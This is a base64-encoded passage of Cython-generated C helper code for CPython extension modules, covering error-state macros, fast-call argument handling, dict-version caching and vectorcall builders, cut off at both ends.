hdGUoUHlUaHJlYWRTdGF0ZV9HRVQoKSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X0VyclJlc3RvcmVJblN0YXRlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICAgIF9fUHl4X0VyckZldGNoSW5TdGF0ZShfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YilcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpO1xuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9FcnJGZXRjaEluU3RhdGUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQzAwQTZcbiNkZWZpbmUgX19QeXhfUHlFcnJfU2V0Tm9uZShleGMpIChQeV9JTkNSRUYoZXhjKSwgX19QeXhfRXJyUmVzdG9yZSgoZXhjKSwgTlVMTCwgTlVMTCkpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZW5kaWZcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RXJyX0NsZWFyKCkgUHlFcnJfQ2xlYXIoKVxuI2RlZmluZSBfX1B5eF9QeUVycl9TZXROb25lKGV4YykgUHlFcnJfU2V0Tm9uZShleGMpXG4jZGVmaW5lIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUodHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdGIpXG4jZGVmaW5lIF9fUHl4X0VyckZldGNoV2l0aFN0YXRlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX0ZldGNoKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyUmVzdG9yZUluU3RhdGUodHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9SZXN0b3JlKHR5cGUsIHZhbHVlLCB0YilcbiNkZWZpbmUgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKSAgUHlFcnJfRmV0Y2godHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJSZXN0b3JlKHR5cGUsIHZhbHVlLCB0YikgIFB5RXJyX1Jlc3RvcmUodHlwZSwgdmFsdWUsIHRiKVxuI2RlZmluZSBfX1B5eF9FcnJGZXRjaCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9GZXRjaCh0eXBlLCB2YWx1ZSwgdGIpXG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobyxuKSBQeU9iamVjdF9HZXRBdHRyKG8sbilcbiNlbmRpZlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcihQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lKTtcblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OYW1lKFB5T2JqZWN0ICpuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMaXN0X0Zyb21BcnJheShQeU9iamVjdCAqY29uc3QgKnNyYywgUHlfc3NpemVfdCBuKTtcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KFB5T2JqZWN0ICpjb25zdCAqc3JjLCBQeV9zc2l6ZV90IG4pO1xuI2VuZGlmXG5cblxuI2luY2x1ZGUgPHN0cmluZy5oPlxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUJ5dGVzX0VxdWFscyhQeU9iamVjdCogczEsIFB5T2JqZWN0KiBzMiwgaW50IGVxdWFscyk7XG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoUHlPYmplY3QqIHMxLCBQeU9iamVjdCogczIsIGludCBlcXVhbHMpO1xuXG5cbiNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX1ZBUkFSR1MoYXJncywgaSkgX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZ3MsIGkpXG4jZWxpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9OZXdSZWYoX19QeXhfUHlUdXBsZV9HRVRfSVRFTShhcmdzLCBpKSlcbiNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfVkFSQVJHUyhhcmdzLCBpKSBfX1B5eF9YTmV3UmVmKFB5VHVwbGVfR2V0SXRlbShhcmdzLCBpKSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfVkFSQVJHUyhrd2RzKSBQeURpY3RfU2l6ZShrd2RzKVxuI2RlZmluZSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKGFyZ3MsIG5hcmdzKSBOVUxMXG4jZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfVkFSQVJHUyhrdywga3d2YWx1ZXMsIHMpIF9fUHl4X1B5RGljdF9HZXRJdGVtU3RyV2l0aEVycm9yKGt3LCBzKVxuI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfVkFSQVJHUyhrdywga3d2YWx1ZXMpIFB5RGljdF9Db3B5KGt3KVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICAgI2RlZmluZSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoYXJncywgaSkgX19QeXhfTmV3UmVmKGFyZ3NbaV0pXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoa3dkcykgX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd2RzKVxuICAgICNkZWZpbmUgX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoYXJncywgbmFyZ3MpICgoYXJncykgKyAobmFyZ3MpKVxuICAgIHN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfR2V0S3dWYWx1ZV9GQVNUQ0FMTChQeU9iamVjdCAqa3duYW1lcywgUHlPYmplY3QgKmNvbnN0ICprd3ZhbHVlcywgUHlPYmplY3QgKnMpO1xuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIENZVEhPTl9VTlVTRUQgc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwoUHlPYmplY3QgKmt3bmFtZXMsIFB5T2JqZWN0ICpjb25zdCAqa3d2YWx1ZXMpO1xuICAjZWxzZVxuICAgICNkZWZpbmUgX19QeXhfS3dhcmdzQXNEaWN0X0ZBU1RDQUxMKGt3LCBrd3ZhbHVlcykgX1B5U3RhY2tfQXNEaWN0KGt3dmFsdWVzLCBrdylcbiAgI2VuZGlmXG4jZWxzZVxuICAgICNkZWZpbmUgX19QeXhfQXJnUmVmX0ZBU1RDQUxMIF9fUHl4X0FyZ1JlZl9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwgX19QeXhfTnVtS3dhcmdzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMIF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1NcbiAgICAjZGVmaW5lIF9fUHl4X0dldEt3VmFsdWVfRkFTVENBTEwgX19QeXhfR2V0S3dWYWx1ZV9WQVJBUkdTXG4gICAgI2RlZmluZSBfX1B5eF9Ld2FyZ3NBc0RpY3RfRkFTVENBTEwgX19QeXhfS3dhcmdzQXNEaWN0X1ZBUkFSR1NcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfVkFSQVJHUyhhcmdzLCBzdGFydCwgc3RvcCkgUHlUdXBsZV9HZXRTbGljZShhcmdzLCBzdGFydCwgc3RvcClcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTCB8fCAoQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTKVxuI2RlZmluZSBfX1B5eF9BcmdzU2xpY2VfRkFTVENBTEwoYXJncywgc3RhcnQsIHN0b3ApIF9fUHl4X1B5VHVwbGVfRnJvbUFycmF5KGFyZ3MgKyBzdGFydCwgc3RvcCAtIHN0YXJ0KVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQXJnc1NsaWNlX0ZBU1RDQUxMKGFyZ3MsIHN0YXJ0LCBzdG9wKSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIHN0YXJ0LCBzdG9wKVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiNkZWZpbmUgX19QWVhfRElDVF9WRVJTSU9OX0lOSVQgICgoUFlfVUlOVDY0X1QpIC0xKVxuI2RlZmluZSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpICAoKChQeURpY3RPYmplY3QqKShkaWN0KSktPm1hX3ZlcnNpb25fdGFnKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcXFxuICAgICh2ZXJzaW9uX3ZhcikgPSBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpO1xcXG4gICAgKGNhY2hlX3ZhcikgPSAodmFsdWUpO1xuI2RlZmluZSBfX1BZWF9QWV9ESUNUX0xPT0tVUF9JRl9NT0RJRklFRChWQVIsIERJQ1QsIExPT0tVUCkge1xcXG4gICAgc3RhdGljIFBZX1VJTlQ2NF9UIF9fcHl4X2RpY3RfdmVyc2lvbiA9IDA7XFxcbiAgICBzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2RpY3RfY2FjaGVkX3ZhbHVlID0gTlVMTDtcXFxuICAgIGlmIChsaWtlbHkoX19QWVhfR0VUX0RJQ1RfVkVSU0lPTihESUNUKSA9PSBfX3B5eF9kaWN0X3ZlcnNpb24pKSB7XFxcbiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZTtcXFxuICAgIH0gZWxzZSB7XFxcbiAgICAgICAgKFZBUikgPSBfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IChMT09LVVApO1xcXG4gICAgICAgIF9fcHl4X2RpY3RfdmVyc2lvbiA9IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oRElDVCk7XFxcbiAgICB9XFxcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF90cF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaik7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQWV9VSU5UNjRfVCBfX1B5eF9nZXRfb2JqZWN0X2RpY3RfdmVyc2lvbihQeU9iamVjdCAqb2JqKTtcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9vYmplY3RfZGljdF92ZXJzaW9uX21hdGNoZXMoUHlPYmplY3QqIG9iaiwgUFlfVUlOVDY0X1QgdHBfZGljdF92ZXJzaW9uLCBQWV9VSU5UNjRfVCBvYmpfZGljdF92ZXJzaW9uKTtcbiNlbHNlXG4jZGVmaW5lIF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oZGljdCkgICgwKVxuI2RlZmluZSBfX1BZWF9VUERBVEVfRElDVF9DQUNIRShkaWN0LCB2YWx1ZSwgY2FjaGVfdmFyLCB2ZXJzaW9uX3ZhcilcbiNkZWZpbmUgX19QWVhfUFlfRElDVF9MT09LVVBfSUZfTU9ESUZJRUQoVkFSLCBESUNULCBMT09LVVApICAoVkFSKSA9IChMT09LVVApO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuI2RlZmluZSBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKHZhciwgbmFtZSkgIGRvIHtcXFxuICAgIHN0YXRpYyBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb24gPSAwO1xcXG4gICAgc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSA9IE5VTEw7XFxcbiAgICAodmFyKSA9IChsaWtlbHkoX19weXhfZGljdF92ZXJzaW9uID09IF9fUFlYX0dFVF9ESUNUX1ZFUlNJT04oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCkpKSA/XFxcbiAgICAgICAgKGxpa2VseShfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSkgPyBfX1B5eF9OZXdSZWYoX19weXhfZGljdF9jYWNoZWRfdmFsdWUpIDogX19QeXhfR2V0QnVpbHRpbk5hbWUobmFtZSkpIDpcXFxuICAgICAgICBfX1B5eF9fR2V0TW9kdWxlR2xvYmFsTmFtZShuYW1lLCAmX19weXhfZGljdF92ZXJzaW9uLCAmX19weXhfZGljdF9jYWNoZWRfdmFsdWUpO1xcXG59IHdoaWxlKDApXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICBkbyB7XFxcbiAgICBQWV9VSU5UNjRfVCBfX3B5eF9kaWN0X3ZlcnNpb247XFxcbiAgICBQeU9iamVjdCAqX19weXhfZGljdF9jYWNoZWRfdmFsdWU7XFxcbiAgICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUsICZfX3B5eF9kaWN0X3ZlcnNpb24sICZfX3B5eF9kaWN0X2NhY2hlZF92YWx1ZSk7XFxcbn0gd2hpbGUoMClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUsIFBZX1VJTlQ2NF9UICpkaWN0X3ZlcnNpb24sIFB5T2JqZWN0ICoqZGljdF9jYWNoZWRfdmFsdWUpO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZSh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG4jZGVmaW5lIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWVVbmNhY2hlZCh2YXIsIG5hbWUpICAodmFyKSA9IF9fUHl4X19HZXRNb2R1bGVHbG9iYWxOYW1lKG5hbWUpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfX0dldE1vZHVsZUdsb2JhbE5hbWUoUHlPYmplY3QgKm5hbWUpO1xuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGwoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcsIFB5T2JqZWN0ICprdyk7XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9DYWxsKGZ1bmMsIGFyZywga3cpIFB5T2JqZWN0X0NhbGwoZnVuYywgYXJnLCBrdylcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZWxpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBsaWtlbHkoUHlMb25nX0NoZWNrRXhhY3QocykpID8gUHlMb25nX1R5cGUudHBfcmVwcihzKSA6XFxcbiAgICAgICAgbGlrZWx5KFB5RmxvYXRfQ2hlY2tFeGFjdChzKSkgPyBQeUZsb2F0X1R5cGUudHBfcmVwcihzKSA6XFxcbiAgICAgICAgUHlPYmplY3RfRm9ybWF0KHMsIGYpKVxuI2Vsc2VcbiAgICAjZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShzLCBmKSAoXFxcbiAgICAgICAgbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KHMpKSA/IChQeV9JTkNSRUYocyksIHMpIDpcXFxuICAgICAgICBQeU9iamVjdF9Gb3JtYXQocywgZikpXG4jZW5kaWZcblxuXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5VW5pY29kZV9Kb2luKFB5T2JqZWN0KiogdmFsdWVzLCBQeV9zc2l6ZV90IHZhbHVlX2NvdW50LCBQeV9zc2l6ZV90IHJlc3VsdF91bGVuZ3RoLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeV9VQ1M0IG1heF9jaGFyKTtcblxuXG4jaWYgQ1lUSE9OX0ZBU1RfUFlDQUxMXG4jaWYgIUNZVEhPTl9WRUNUT1JDQUxMXG4jZGVmaW5lIF9fUHl4X1B5RnVuY3Rpb25fRmFzdENhbGwoZnVuYywgYXJncywgbmFyZ3MpXFxcbiAgICBfX1B5eF9QeUZ1bmN0aW9uX0Zhc3RDYWxsRGljdCgoZnVuYyksIChhcmdzKSwgKG5hcmdzKSwgTlVMTClcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlGdW5jdGlvbl9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoY29uZClcXFxuICAgIChzaXplb2YoY2hhciBbMSAtIDIqIShjb25kKV0pIC0gMSlcbiNpZm5kZWYgUHlfTUVNQkVSX1NJWkVcbiNkZWZpbmUgUHlfTUVNQkVSX1NJWkUodHlwZSwgbWVtYmVyKSBzaXplb2YoKCh0eXBlICopMCktPm1lbWJlcilcbiNlbmRpZlxuI2lmICFDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDBcbiAgI2luY2x1ZGUgImZyYW1lb2JqZWN0LmgiXG4gICNkZWZpbmUgX19QeHlfUHlGcmFtZV9Jbml0aWFsaXplX09mZnNldHMoKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfR2V0TG9jYWxzcGx1cyhmcmFtZSkgICgoZnJhbWUpLT5mX2xvY2Fsc3BsdXMpXG4jZWxzZVxuICBzdGF0aWMgc2l6ZV90IF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQgPSAwO1xuICAjaW5jbHVkZSAiZnJhbWVvYmplY3QuaCJcbiAgI2RlZmluZSBfX1B4eV9QeUZyYW1lX0luaXRpYWxpemVfT2Zmc2V0cygpXFxcbiAgICAoKHZvaWQpX19QeXhfQlVJTERfQVNTRVJUX0VYUFIoc2l6ZW9mKFB5RnJhbWVPYmplY3QpID09IG9mZnNldG9mKFB5RnJhbWVPYmplY3QsIGZfbG9jYWxzcGx1cykgKyBQeV9NRU1CRVJfU0laRShQeUZyYW1lT2JqZWN0LCBmX2xvY2Fsc3BsdXMpKSxcXFxuICAgICAodm9pZCkoX19weXhfcHlmcmFtZV9sb2NhbHNwbHVzX29mZnNldCA9ICgoc2l6ZV90KVB5RnJhbWVfVHlwZS50cF9iYXNpY3NpemUpIC0gUHlfTUVNQkVSX1NJWkUoUHlGcmFtZU9iamVjdCwgZl9sb2NhbHNwbHVzKSkpXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9HZXRMb2NhbHNwbHVzKGZyYW1lKVxcXG4gICAgKGFzc2VydChfX3B5eF9weWZyYW1lX2xvY2Fsc3BsdXNfb2Zmc2V0KSwgKFB5T2JqZWN0ICoqKSgoKGNoYXIgKikoZnJhbWUpKSArIF9fcHl4X3B5ZnJhbWVfbG9jYWxzcGx1c19vZmZzZXQpKVxuI2VuZGlmXG4jZW5kaWZcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aE8oUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpO1xuI2VuZGlmXG5cblxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChmdW5jLCBhcmdzLCBuYXJncykgIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdChmdW5jLCBhcmdzLCAoc2l6ZV90KShuYXJncyksIE5VTEwpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfRmFzdENhbGxEaWN0KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqIGNvbnN0KmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3YXJncyk7XG5cblxuI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDBcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmKSBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG5hbWUsIGFyZ3MsIG5hcmdzZiwgTlVMTClcbiNlbHNlXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpO1xuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTtcblxuXG4jaWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7XG4gICAgUHlMaXN0T2JqZWN0KiBMID0gKFB5TGlzdE9iamVjdCopIGxpc3Q7XG4gICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpO1xuICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSkge1xuICAgICAgICBQeV9JTkNSRUYoeCk7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMFxuICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4O1xuICAgICAgICAjZWxzZVxuICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X1NFVF9TSVpFKGxpc3QsIGxlbiArIDEpO1xuICAgICAgICByZXR1cm4gMDtcbiAgICB9XG4gICAgcmV0dXJuIFB5TGlzdF9BcHBlbmQobGlzdCwgeCk7XG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9MaXN0Q29tcF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseClcbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiNkZWZpbmUgX19QeXhfR2V0RXhjZXB0aW9uKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19HZXRFeGNlcHRpb24oX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpXG5zdGF0aWMgaW50IF9fUHl4X19HZXRFeGNlcHRpb24oUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpO1xuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfR2V0RXhjZXB0aW9uKFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7XG4jZW5kaWZcblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKGludCBpbl9hc3luY19nZW4pO1xuXG5cbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVW5pY29kZShvYmopXFxcbiAgICAobGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KG9iaikpID8gX19QeXhfTmV3UmVmKG9iaikgOiBQeU9iamVjdF9TdHIob2JqKSlcblxuXG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2lmIENZVEhPTl9WRUNUT1JDQUxMXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuI2RlZmluZSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIgUHlPYmplY3RfVmVjdG9yY2FsbFxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9QeU9iamVjdF9WZWN0b3JjYWxsXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyhuKSBQeVR1cGxlX05ldyhuKVxuc3RhdGljIGludCBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqYnVpbGRlciwgUHlPYmplY3QgKiphcmdzLCBpbnQgbik7XG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pO1xuI2Vsc2VcbiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsRGljdFxuI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKVxuI2RlZmluZSBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSw